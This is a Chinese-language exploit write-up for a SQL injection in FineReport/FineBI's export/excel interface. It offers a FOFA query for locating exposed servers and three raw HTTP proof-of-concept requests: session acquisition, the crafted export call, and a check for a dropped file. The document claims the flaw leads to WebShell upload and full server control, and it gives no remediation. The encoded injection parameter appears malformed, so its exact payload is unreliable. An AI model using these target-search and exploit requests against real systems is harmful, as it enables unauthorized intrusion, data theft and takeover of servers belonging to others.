## 帆软报表-FineReport-export/excel-SQL注入漏洞

## 一、漏洞简介
攻击者可通过构造恶意SQL语句，利用export/excel接口传入未校验的参数，实现SQL注入攻击。成功利用该漏洞可上传WebShell，进而获取服务器权限，执行任意系统命令，导致数据泄露、服务器被控制等严重后果。

## fofa
```
body="/webroot/decision/" || (body="FineReport" && body="content=""FineReport--Web Reporting Tool""") || title="FineReport" || title="FineReport报表" || title="FineBI"
```

## POC
```
GET /webroot/ReportServer- HTTP/1.1
Host: [被遮挡]
viewlets: [{'reportlet':'/'}]
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
op: getSessionID
```

## POC
```
GET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7b%7d&parameters=%3Cpd%3E%0A%3CLargeDatasetExcelExportJS%0A%20%20dsName%3D%22LARGE_DATASET%22%20parameter%3E%3C%2FParameter%3E%3C%2FParameters%3E%3C%2FLargeDatasetExcelExportJS%3E&sessionID=489ddacc-598b-4a59-8bc3-c5d9ba776540 HTTP/1.1
Host: [被遮挡]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_18_) AppleWebKit/605.1.18 (KHTML, like Gecko) Version/18 Safari/605.1.18
Accept-Encoding: gzip
```

## POC
```
GET /webroot/kIntimjr2fxc.txt HTTP/1.1
Host: [被遮挡]
Accept-Ranges: bytes
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15
Accept-Encoding: gzip
```
